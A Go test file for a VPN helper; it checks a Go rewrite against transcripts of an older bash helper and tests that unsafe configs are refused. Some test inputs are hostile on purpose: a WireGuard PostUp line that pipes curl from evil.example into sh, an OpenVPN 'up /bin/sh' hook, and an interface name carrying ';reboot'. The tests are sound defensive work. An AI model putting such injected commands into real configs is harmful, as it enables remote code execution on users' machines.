package ops

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

// This test replays every verb against the golden transcripts in
// testdata/transcripts/, captured from the ORIGINAL bash helper by
// scripts/capture-helper-transcripts.sh. The fake Env below answers the query
// commands (`ip link show`, `ip -o link show type wireguard`, `ip rule show`)
// exactly the way that script's shims did, so both sides see the same world and
// the state-changing commands they issue, the state files they leave and their
// exit status can be compared one for one.
//
// Filter, applied identically to both sides: query commands are dropped
// (Go reads /sys/class/net instead of spawning `ip link show`, deviation 10);
// `pkill` is dropped (the pid-less fallback is a /proc scan, deviation 4, and is
// asserted through Env.Kill instead); argv[0] is reduced to its basename (the
// shims logged basenames; Go passes resolved paths); the temp Root is stripped;
// and the config path is normalised, because Go hands every tool its own
// root-owned copy under /run/katacomb-vpn (deviation 6) where bash handed the
// caller's path.

// --- the fake machine ----------------------------------------------------------

type fakeEnv struct {
	*Env
	t      *testing.T
	root   string
	cmds   [][]string
	kills  []string
	warns  []string
	wgtype bool
	rules  map[string]int
	ovpnOK bool
	nextPid int
	pinOK  map[string]bool // basename -> VerifyPin passes
}

func newFake(t *testing.T) *fakeEnv {
	t.Helper()
	root := t.TempDir()
	f := &fakeEnv{t: t, root: root, rules: map[string]int{}, ovpnOK: true, nextPid: 31337, pinOK: map[string]bool{}}
	f.Env = &Env{
		Run:      f.run,
		Spawn:    f.spawn,
		Kill:     f.kill,
		Sleep:    func(time.Duration) {},
		Root:     root,
		BinDir:   filepath.Join(root, "shim", "awgbin"),
		LookPath: func(name string) (string, error) { return name, nil },
		VerifyPin: func(path, name string) error {
			// /proc/<pid>/exe is a symlink to the binary: judge the target, as the
			// real VerifyPin hashes the target's bytes.
			if real, err := filepath.EvalSymlinks(path); err == nil {
				path = real
			}
			if f.pinOK[filepath.Base(path)] && filepath.Base(path) == name {
				return nil
			}
			return fmt.Errorf("%s failed SHA-256 integrity check", name)
		},
		Executable: func() (string, error) { return filepath.Join(root, "usr/local/bin/katacomb-vpn-helper"), nil },
		Warn:       func(m string) { f.warns = append(f.warns, m) },
	}
	for _, d := range []string{"sys/class/net", "shim/bin", "shim/awgbin", "usr/sbin", "usr/local/bin", "proc", "etc"} {
		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for _, b := range []string{"usr/local/bin/katacomb-vpn-helper", "shim/awgbin/awg", "shim/awgbin/awg-quick", "shim/awgbin/amneziawg-go", "usr/sbin/openvpn"} {
		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
		if filepath.Base(b) != "openvpn" { // distro binary, never pinned
			f.pinOK[filepath.Base(b)] = true
		}
	}
	return f
}

func (f *fakeEnv) linkPath(name string) string { return filepath.Join(f.root, "sys/class/net", name) }
func (f *fakeEnv) addLink(name string)         { _ = os.WriteFile(f.linkPath(name), nil, 0o644) }
func (f *fakeEnv) hasLink(name string) bool    { _, err := os.Stat(f.linkPath(name)); return err == nil }
func (f *fakeEnv) delLink(name string) bool {
	if !f.hasLink(name) {
		return false
	}
	_ = os.Remove(f.linkPath(name))
	if name == "sntl0" {
		f.wgtype = false
	}
	return true
}
func (f *fakeEnv) leakRules() {
	for _, k := range []string{"-4.fw", "-4.sp", "-6.fw", "-6.sp"} {
		f.rules[k] = 2
	}
}

func (f *fakeEnv) run(_ context.Context, argv []string, _ RunOpt) ([]byte, []byte, error) {
	f.cmds = append(f.cmds, append([]string(nil), argv...))
	fail := func(msg string, code int) ([]byte, []byte, error) {
		return nil, []byte(msg), &ExitError{Argv: argv, Code: code, Stderr: msg}
	}
	a := argv[1:]
	switch filepath.Base(argv[0]) {
	case "ip":
		fam := ""
		if len(a) > 0 && (a[0] == "-4" || a[0] == "-6") {
			fam, a = a[0], a[1:]
		}
		switch {
		case len(a) == 5 && a[0] == "-o" && a[1] == "link" && a[2] == "show" && a[3] == "type" && a[4] == "wireguard":
			if f.hasLink("sntl0") && f.wgtype {
				return []byte("5: sntl0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1420 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\\    link/none \n"), nil, nil
			}
			return nil, nil, nil
		case len(a) == 3 && a[0] == "link" && a[1] == "show":
			if f.hasLink(a[2]) {
				return nil, nil, nil
			}
			return fail("Device \""+a[2]+"\" does not exist.", 1)
		case len(a) == 3 && a[0] == "link" && a[1] == "delete":
			if f.delLink(a[2]) {
				return nil, nil, nil
			}
			return fail("Cannot find device \""+a[2]+"\"", 1)
		case len(a) == 2 && a[0] == "rule" && a[1] == "show":
			var sb strings.Builder
			for i := 0; i < f.rules[fam+".fw"]; i++ {
				sb.WriteString("32764:\tnot from all fwmark 0xca6c lookup 51820\n")
			}
			for i := 0; i < f.rules[fam+".sp"]; i++ {
				sb.WriteString("32765:\tfrom all lookup main suppress_prefixlength 0\n")
			}
			return []byte(sb.String()), nil, nil
		case len(a) >= 2 && a[0] == "rule" && a[1] == "delete":
			k := fam + ".fw"
			if strings.Contains(strings.Join(a, " "), "suppress_prefixlength 0") {
				k = fam + ".sp"
			}
			if f.rules[k] <= 0 {
				return fail("RTNETLINK answers: No such file or directory", 2)
			}
			f.rules[k]--
			return nil, nil, nil
		}
		return nil, nil, nil
	case "wg-quick":
		if len(a) >= 1 && a[0] == "up" {
			f.addLink("sntl0")
			f.wgtype = true
			f.leakRules()
			return nil, nil, nil
		}
		// Fails live: our config is never in /etc/wireguard.
		return fail("wg-quick: `"+a[len(a)-1]+"' is not a WireGuard interface", 1)
	case "awg-quick":
		if len(a) >= 1 && a[0] == "up" {
			f.addLink("sntl0")
			f.leakRules()
		}
		return nil, nil, nil
	case "openvpn":
		var pidFile, logFile string
		for i := 0; i+1 < len(a); i++ {
			switch a[i] {
			case "--writepid":
				pidFile = a[i+1]
			case "--log":
				logFile = a[i+1]
			}
		}
		_ = os.WriteFile(pidFile, []byte("4242\n"), 0o644)
		if f.ovpnOK {
			_ = os.WriteFile(logFile, []byte(ovpnOKLog), 0o644)
			f.addLink("sntl-ovpn")
		} else {
			_ = os.WriteFile(logFile, []byte(ovpnFailLog), 0o644)
		}
		return nil, nil, nil
	}
	return nil, nil, nil
}

// Identical to the shim's log texts, so the .state snapshots compare.
const (
	ovpnOKLog = "TCP/UDP: Preserving recently used remote address: [AF_INET]203.0.113.10:1194\n" +
		"TUN/TAP device sntl-ovpn opened\n" +
		"Initialization Sequence Completed\n"
	ovpnFailLog = "TCP/UDP: Preserving recently used remote address: [AF_INET]203.0.113.10:1194\n" +
		"UDP link local: (not bound)\n" +
		"UDP link remote: [AF_INET]203.0.113.10:1194\n" +
		"TLS Error: TLS key negotiation failed to occur within 10 seconds (check your network connectivity)\n" +
		"TLS Error: TLS handshake failed\n" +
		"SIGUSR1[soft,tls-error] received, process restarting\n" +
		"Restart pause, 1 second(s)\n"
)

func (f *fakeEnv) spawn(argv []string, _ RunOpt) (int, error) {
	f.cmds = append(f.cmds, append([]string(nil), argv...))
	f.nextPid++
	if len(argv) > 1 && argv[1] == "_tun2socks" {
		f.addLink("sntl-tun")
	}
	return f.nextPid, nil
}

func (f *fakeEnv) kill(pid int, sig syscall.Signal) error {
	f.kills = append(f.kills, fmt.Sprintf("%d:%d", pid, sig))
	if pid == 4242 { // the shim's fake openvpn pid: no such process
		return syscall.ESRCH
	}
	return nil
}

// --- normalisation, applied to both sides ------------------------------------

func normalise(argv []string, root string) []string {
	if len(argv) == 0 {
		return nil
	}
	out := make([]string, 0, len(argv))
	for i, tok := range argv {
		if i == 0 {
			tok = filepath.Base(tok)
		} else if root != "" && strings.HasPrefix(tok, root) {
			tok = strings.TrimPrefix(tok, root)
		}
		switch {
		case strings.HasSuffix(tok, "/sntl0.conf"):
			tok = "<sntl0.conf>"
		case strings.HasSuffix(tok, "/openvpn.conf"):
			tok = "<openvpn.conf>"
		}
		out = append(out, tok)
	}
	// The bash helper spawned the vendored `tun2socks …`; the Go helper self-execs
	// `<self> _tun2socks …` with the same flags (the engine is embedded).
	if out[0] == "katacomb-vpn-helper" && len(out) > 1 && out[1] == "_tun2socks" {
		out = append([]string{"tun2socks"}, out[2:]...)
	}
	a := out[1:]
	switch out[0] {
	case "ip":
		if len(a) > 0 && (a[0] == "-4" || a[0] == "-6") {
			a = a[1:]
		}
		if len(a) == 3 && a[0] == "link" && a[1] == "show" {
			return nil
		}
		if len(a) == 5 && a[0] == "-o" && a[1] == "link" && a[2] == "show" {
			return nil
		}
		if len(a) == 2 && a[0] == "rule" && a[1] == "show" {
			return nil
		}
	case "ip6tables":
		if len(a) == 1 && a[0] == "-S" {
			return nil
		}
	case "getent", "pkill":
		return nil
	}
	return out
}

func (f *fakeEnv) takeCmds() []string {
	var lines []string
	for _, c := range f.cmds {
		if n := normalise(c, f.root); n != nil {
			lines = append(lines, strings.Join(n, " "))
		}
	}
	f.cmds = nil
	return lines
}

func (f *fakeEnv) takeKills() []string {
	k := f.kills
	f.kills = nil
	return k
}

// --- the transcript files --------------------------------------------------------

const transcriptDir = "testdata/transcripts"

func readTranscriptArgv(t *testing.T, label string) []string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(transcriptDir, label+".argv"))
	if err != nil {
		t.Fatalf("missing transcript %s.argv (run scripts/capture-helper-transcripts.sh): %v", label, err)
	}
	var lines []string
	for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
		if l == "" {
			continue
		}
		if n := normalise(strings.Split(l, " "), ""); n != nil {
			lines = append(lines, strings.Join(n, " "))
		}
	}
	return lines
}

type transcriptOut struct {
	exit   int
	stdout string
	stderr string
}

func readTranscriptOut(t *testing.T, label string) transcriptOut {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(transcriptDir, label+".out"))
	if err != nil {
		t.Fatal(err)
	}
	var o transcriptOut
	for _, l := range strings.Split(string(b), "\n") {
		switch {
		case strings.HasPrefix(l, "exit: "):
			o.exit, _ = strconv.Atoi(strings.TrimPrefix(l, "exit: "))
		case strings.HasPrefix(l, "stdout: "):
			o.stdout = strings.TrimPrefix(l, "stdout: ")
		case strings.HasPrefix(l, "stderr: "):
			o.stderr = strings.TrimPrefix(l, "stderr: ")
		}
	}
	return o
}

// readTranscriptState drops the directory lines: Go creates /run/katacomb-vpn on
// the first verb (the lock, deviation 8) where bash created it lazily, so the
// directories' presence differs by design; their modes are asserted separately.
func readTranscriptState(t *testing.T, label string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(transcriptDir, label+".state"))
	if err != nil {
		t.Fatal(err)
	}
	var keep []string
	for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
		if strings.HasSuffix(strings.Fields(l)[0], "/") {
			continue
		}
		keep = append(keep, l)
	}
	return strings.Join(keep, "\n")
}

func normalisePid(line string) string {
	i := 0
	for i < len(line) && line[i] >= '0' && line[i] <= '9' {
		i++
	}
	if i > 0 && i < len(line) && line[i] == ' ' {
		return "<PID>" + line[i:]
	}
	return line
}

// snapshot renders the fake machine the way the capture script's snapshot() did,
// minus directory lines and minus the two things bash never had: the dotfile
// lock and the root-owned config copies (deviation 6).
func (f *fakeEnv) snapshot(t *testing.T) string {
	t.Helper()
	var out []string
	for _, dir := range []string{RunDir, PersistDir} {
		entries, err := os.ReadDir(filepath.Join(f.root, dir))
		if err != nil {
			continue
		}
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			n := e.Name()
			if strings.HasPrefix(n, ".") || strings.HasSuffix(n, ".conf") {
				continue
			}
			names = append(names, n)
		}
		sort.Strings(names)
		for _, n := range names {
			p := filepath.Join(f.root, dir, n)
			fi, err := os.Lstat(p)
			if err != nil {
				t.Fatal(err)
			}
			if fi.Mode()&os.ModeSymlink != 0 {
				target, _ := os.Readlink(p)
				out = append(out, fmt.Sprintf("%s/%s -> %s", dir, n, target))
				continue
			}
			out = append(out, fmt.Sprintf("%s/%s mode=%o", dir, n, fi.Mode().Perm()))
			if b, _ := os.ReadFile(p); len(b) > 0 {
				for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
					out = append(out, "  "+normalisePid(l))
				}
			}
		}
	}
	resolv := filepath.Join(f.root, resolvConf)
	if fi, err := os.Lstat(resolv); err == nil && fi.Mode()&os.ModeSymlink != 0 {
		target, _ := os.Readlink(resolv)
		out = append(out, "/etc/resolv.conf -> "+target)
	} else if err == nil {
		out = append(out, fmt.Sprintf("/etc/resolv.conf mode=%o", fi.Mode().Perm()))
		if b, _ := os.ReadFile(resolv); len(b) > 0 {
			for _, l := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
				out = append(out, "  "+l)
			}
		}
	} else {
		out = append(out, "/etc/resolv.conf absent")
	}
	return strings.Join(out, "\n")
}

func diffLines(want, got []string) string {
	var sb strings.Builder
	n := len(want)
	if len(got) > n {
		n = len(got)
	}
	for i := 0; i < n; i++ {
		w, g := "", ""
		if i < len(want) {
			w = want[i]
		}
		if i < len(got) {
			g = got[i]
		}
		mark := "  "
		if w != g {
			mark = "!!"
		}
		fmt.Fprintf(&sb, "%s bash: %-70s | go: %s\n", mark, w, g)
	}
	return sb.String()
}

// --- the replay ----------------------------------------------------------------

var (
	cfgWG   = mustRead("../guard/testdata/corpus/wireguard/clean.conf")
	cfgAWG  = mustRead("../guard/testdata/corpus/amneziawg/clean.conf")
	cfgOVPN = mustRead("../guard/testdata/corpus/openvpn/clean.conf")
)

func mustRead(p string) []byte {
	b, err := os.ReadFile(p)
	if err != nil {
		panic(err)
	}
	return b
}

func TestTranscriptParity(t *testing.T) {
	f := newFake(t)
	ctx := context.Background()
	// The container started with a plain-file resolv.conf of known content.
	resolv := filepath.Join(f.root, resolvConf)
	if err := os.WriteFile(resolv, []byte("nameserver 10.0.0.53\nsearch example.test\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	step := func(label string, fn func() error) {
		t.Helper()
		f.cmds, f.kills = nil, nil
		err := fn()
		want := readTranscriptOut(t, label)
		if (err != nil) != (want.exit != 0) {
			t.Errorf("%s: bash exited %d, go error = %v", label, want.exit, err)
		}
		if err != nil && want.stderr != "" {
			wantMsg := strings.TrimPrefix(want.stderr, "Error: ")
			gotMsg := strings.ReplaceAll(err.Error(), f.root, "")
			if guardRefusals[label] {
				// Guard wording differs by design (deviation 6: line + reason, no
				// content); the reason word is what both carry.
				if !strings.Contains(gotMsg, "not allowed") || !strings.Contains(wantMsg, "not allowed") {
					t.Errorf("%s: both sides must refuse with 'not allowed': bash %q, go %q", label, wantMsg, gotMsg)
				}
			} else if gotMsg != wantMsg {
				t.Errorf("%s: stderr\n bash: %q\n go:   %q", label, wantMsg, gotMsg)
			}
		}
		wantArgv := readTranscriptArgv(t, label)
		gotArgv := f.takeCmds()
		if strings.Join(wantArgv, "\n") != strings.Join(gotArgv, "\n") {
			t.Errorf("%s: argv differs\n%s", label, diffLines(wantArgv, gotArgv))
		}
		wantState := readTranscriptState(t, label)
		gotState := f.snapshot(t)
		if wantState != gotState {
			t.Errorf("%s: state differs\n--- bash ---\n%s\n--- go ---\n%s", label, wantState, gotState)
		}
	}

	awgBin := f.BinDir
	self, _ := f.Executable()
	tunUp := func(bypass ...string) func() error {
		return func() error {
			pid, err := TunUp(ctx, f.Env, TunUpParams{SocksAddr: "127.0.0.1:1080", RemoteHost: "203.0.113.7", Gateway: "192.168.1.1", Iface: "eth0", BypassRoutes: bypass})
			if err == nil && pid == 0 {
				t.Errorf("tun-up returned no pid")
			}
			return err
		}
	}
	ks := func(p KillswitchParams) func() error { return func() error { return KillswitchOn(ctx, f.Env, p) } }

	step("01-up", func() error { return WireguardUp(ctx, f.Env, cfgWG) })
	step("02-killswitch-on", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "203.0.113.7"}))
	step("03-killswitch-on-dns", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "203.0.113.7", DnsIp: "1.1.1.1"}))
	step("04-killswitch-on-lan", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "203.0.113.7", LanSharing: true}))
	step("05-killswitch-on-dns-lan", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "203.0.113.7", DnsIp: "1.1.1.1", LanSharing: true}))
	step("06-dns-set-first", func() error { return DnsSet(ctx, f.Env, "1.1.1.1") })
	step("07-dns-set-second", func() error { return DnsSet(ctx, f.Env, "9.9.9.9") })
	step("08-dns-restore", func() error { return DnsRestore(ctx, f.Env) })
	step("09-killswitch-off", func() error { return KillswitchOff(ctx, f.Env) })
	step("10-down", func() error { return WireguardDown(ctx, f.Env) })
	if f.hasLink("sntl0") || f.wgtype {
		t.Fatal("down must remove sntl0")
	}
	for k, v := range f.rules {
		if v != 0 {
			t.Errorf("cleanup_wg_rules left %s = %d", k, v)
		}
	}
	step("11-awg-up", func() error { return AmneziaWgUp(ctx, f.Env, cfgAWG, awgBin) })
	step("12-awg-down", func() error { return AmneziaWgDown(ctx, f.Env) })
	step("13-ovpn-up", func() error { return OpenVpnUp(ctx, f.Env, cfgOVPN) })
	step("14-ovpn-down", func() error { return OpenVpnDown(ctx, f.Env) })
	if !strings.Contains(strings.Join(f.takeKills(), ","), "4242:15") {
		t.Errorf("ovpn-down must SIGTERM the pid in openvpn.pid")
	}
	f.ovpnOK = false
	step("15-ovpn-up-timeout", func() error { return OpenVpnUp(ctx, f.Env, cfgOVPN) })
	f.ovpnOK = true
	if f.hasLink("sntl-ovpn") {
		t.Fatal("the timeout branch must delete the link")
	}
	step("16-tun-up", tunUp())
	pid16 := f.nextPid
	step("17-tun-down", func() error { return TunDown(ctx, f.Env) })
	if k := strings.Join(f.takeKills(), ","); !strings.Contains(k, fmt.Sprintf("%d:15", pid16)) {
		t.Errorf("tun-down must SIGTERM the pid in tun.state, kills = %s", k)
	}
	step("18-tun-up-bypass", tunUp("10.0.0.0/8", "192.168.0.0/16"))
	step("19-tun-down-bypass", func() error { return TunDown(ctx, f.Env) })
	step("20-tun-up-again", tunUp())
	pid20 := f.nextPid
	// A crash (or an upgrade that wiped /run) loses tun.state: the fallback is a
	// /proc scan (deviation 4). Plant the real engine plus decoys that the bash
	// `pkill -f tun://sntl-tun` WOULD have killed and this must not.
	removeQuiet(f.runPath(tunStateName))
	plantProc := func(pid int, exe string, argv ...string) {
		dir := filepath.Join(f.root, "proc", strconv.Itoa(pid))
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "cmdline"), []byte(strings.Join(argv, "\x00")+"\x00"), 0o444); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(exe, filepath.Join(dir, "exe")); err != nil {
			t.Fatal(err)
		}
	}
	plantProc(pid20, self, "katacomb-vpn-helper", "_tun2socks", "-device", "tun://sntl-tun", "-proxy", "socks5://127.0.0.1:1080")
	plantProc(777, filepath.Join(f.root, "usr/sbin/openvpn"), "openvpn", "_tun2socks", "tun://sntl-tun")            // wrong executable
	plantProc(778, self, "katacomb-vpn-helper", "_tun2socks", "-device", "--note=tun://sntl-tun")                   // substring, not a whole entry
	plantProc(779, self, "katacomb-vpn-helper", "daemon", "tun://sntl-tun")                                        // our binary, not the sub-mode
	plantProc(780, filepath.Join(f.root, "usr/sbin/openvpn"), "bash", "-c", "echo tun://sntl-tun")                // what pkill -f matched
	plantProc(781, self+" (deleted)", "katacomb-vpn-helper", "_tun2socks", "-device", "tun://sntl-tun")            // engine from before an upgrade
	step("21-tun-down-nostate", func() error { return TunDown(ctx, f.Env) })
	if k := strings.Join(f.takeKills(), ","); k != fmt.Sprintf("%d:15,781:15", pid20) {
		t.Errorf("the pid-less fallback must kill exactly our own _tun2socks processes, got kills = %q", k)
	}
	step("22-dns-restore-noop", func() error { return DnsRestore(ctx, f.Env) })
	removeQuiet(resolv)
	if err := os.Symlink("/run/systemd/resolve/stub-resolv.conf", resolv); err != nil {
		t.Fatal(err)
	}
	step("23-dns-set-symlink", func() error { return DnsSet(ctx, f.Env, "8.8.8.8") })
	step("24-dns-restore-symlink", func() error { return DnsRestore(ctx, f.Env) })
	removeQuiet(resolv)
	step("25-dns-set-absent", func() error { return DnsSet(ctx, f.Env, "9.9.9.9") })
	step("26-dns-restore-absent", func() error { return DnsRestore(ctx, f.Env) })

	// Refusals: exit 1, Error: on stderr, and NOT ONE tool runs.
	postup := []byte(strings.Replace(string(cfgWG), "MTU = 1420", "PostUp = touch /tmp/pwned", 1))
	step("30-up-postup", func() error { return WireguardUp(ctx, f.Env, postup) })
	step("32-killswitch-on-zero", ks(KillswitchParams{Iface: "sntl0", RemoteHost: "0.0.0.0"}))
	// 33-tun-up-missing-bin is not replayed: the bash helper refused a missing
	// tun2socks path, and the engine is embedded now (the slot is ignored).
	if err := os.MkdirAll(filepath.Join(f.root, "tmp/emptybin"), 0o755); err != nil {
		t.Fatal(err)
	}
	step("35-awg-up-missing-bin", func() error { return AmneziaWgUp(ctx, f.Env, cfgAWG, filepath.Join(f.root, "tmp/emptybin")) })
	ovpnUp := []byte(strings.Replace(string(cfgOVPN), "nobind", "up /bin/sh", 1))
	step("36-ovpn-up-script", func() error { return OpenVpnUp(ctx, f.Env, ovpnUp) })
	step("37-killswitch-on-badiface", ks(KillswitchParams{Iface: "sntl0;reboot", RemoteHost: "203.0.113.7"}))
	step("38-tun-up-badsocks", func() error {
		_, err := TunUp(ctx, f.Env, TunUpParams{SocksAddr: "localhost:1080", RemoteHost: "203.0.113.7", Gateway: "192.168.1.1", Iface: "eth0"})
		return err
	})
	if len(f.warns) != 0 {
		t.Errorf("no warning expected across the replay, got %q", f.warns)
	}
}

var guardRefusals = map[string]bool{"30-up-postup": true, "36-ovpn-up-script": true}

// The directories the verbs create are 0700, as ensure_run_dir / ensure_persist_dir made them.
func TestStateDirsAre0700(t *testing.T) {
	f := newFake(t)
	if err := DnsSet(context.Background(), f.Env, "1.1.1.1"); err != nil {
		t.Fatal(err)
	}
	for _, d := range []string{RunDir, PersistDir} {
		fi, err := os.Stat(filepath.Join(f.root, d))
		if err != nil {
			t.Fatal(err)
		}
		if fi.Mode().Perm() != 0o700 {
			t.Errorf("%s is %o, want 700", d, fi.Mode().Perm())
		}
	}
}

// The tools' failing stderr reaches the caller verbatim: the app's DNS-less
// retry keys off `/resolvconf/i` in it.
func TestToolStderrIsFoldedIntoTheError(t *testing.T) {
	f := newFake(t)
	f.Env.Run = func(_ context.Context, argv []string, _ RunOpt) ([]byte, []byte, error) {
		if filepath.Base(argv[0]) == "wg-quick" {
			msg := "[#] resolvconf -a sntl0 -m 0 -x\n/usr/bin/wg-quick: line 32: resolvconf: command not found\n"
			return nil, []byte(msg), &ExitError{Argv: argv, Code: 127, Stderr: msg}
		}
		return nil, nil, nil
	}
	err := WireguardUp(context.Background(), f.Env, cfgWG)
	if err == nil || !strings.Contains(err.Error(), "resolvconf: command not found") {
		t.Fatalf("want wg-quick's stderr in the error, got %v", err)
	}
}

// A one-shot and a daemon op cannot interleave: the flock is taken by every
// state-changing verb (deviation 8).
func TestStateChangingVerbsTakeTheLock(t *testing.T) {
	f := newFake(t)
	lock := f.runPath(lockName)
	if err := ensureRunDir(f.Env); err != nil {
		t.Fatal(err)
	}
	held, err := os.OpenFile(lock, os.O_CREATE|os.O_RDWR, 0o600)
	if err != nil {
		t.Fatal(err)
	}
	defer held.Close()
	if err := syscall.Flock(int(held.Fd()), syscall.LOCK_EX); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 150*time.Millisecond)
	defer cancel()
	if err := KillswitchOff(ctx, f.Env); err == nil || !strings.Contains(err.Error(), "still running") {
		t.Fatalf("want a bounded lock failure, got %v", err)
	}
	if len(f.cmds) != 0 {
		t.Fatalf("nothing may run while the lock is held, got %v", f.cmds)
	}
	// Status needs no lock.
	_ = Status(f.Env)
}

// A missing Run-level Sleep would spin: the polls must call Sleep between tries.
func TestOpenVpnPollWaitsBetweenTries(t *testing.T) {
	f := newFake(t)
	f.ovpnOK = false
	sleeps := 0
	f.Env.Sleep = func(time.Duration) { sleeps++ }
	if err := OpenVpnUp(context.Background(), f.Env, cfgOVPN); err == nil {
		t.Fatal("want the timeout error")
	}
	if sleeps != ovpnPollTries {
		t.Fatalf("want %d sleeps, got %d", ovpnPollTries, sleeps)
	}
}

func TestTunUpKillsTheChildWhenNoInterfaceAppears(t *testing.T) {
	f := newFake(t)
	f.Env.Spawn = func(argv []string, _ RunOpt) (int, error) { return 4321, nil } // never creates sntl-tun
	_, err := TunUp(context.Background(), f.Env, TunUpParams{SocksAddr: "127.0.0.1:1080", RemoteHost: "203.0.113.7", Gateway: "192.168.1.1", Iface: "eth0"})
	if err == nil || !strings.Contains(err.Error(), "TUN interface did not appear") {
		t.Fatalf("got %v", err)
	}
	if k := strings.Join(f.takeKills(), ","); k != "4321:15" {
		t.Fatalf("want SIGTERM to the child, got %q", k)
	}
	if fileExists(f.runPath(tunStateName)) {
		t.Fatal("no state may be written on failure")
	}
}

func TestErrorsNeverEchoConfig(t *testing.T) {
	f := newFake(t)
	secret := []byte("[Interface]\nPrivateKey = aGVsbG8=\nPostUp = curl http://evil.example/x | sh\n")
	err := WireguardUp(context.Background(), f.Env, secret)
	if err == nil || strings.Contains(err.Error(), "evil.example") {
		t.Fatalf("got %v", err)
	}
	if err := AmneziaWgUp(context.Background(), f.Env, secret, f.BinDir); err == nil || strings.Contains(err.Error(), "evil.example") {
		t.Fatalf("got %v", err)
	}
	if err := OpenVpnUp(context.Background(), f.Env, []byte("client\nup /bin/sh -c 'curl evil.example'\n")); err == nil || strings.Contains(err.Error(), "evil.example") {
		t.Fatalf("got %v", err)
	}
}
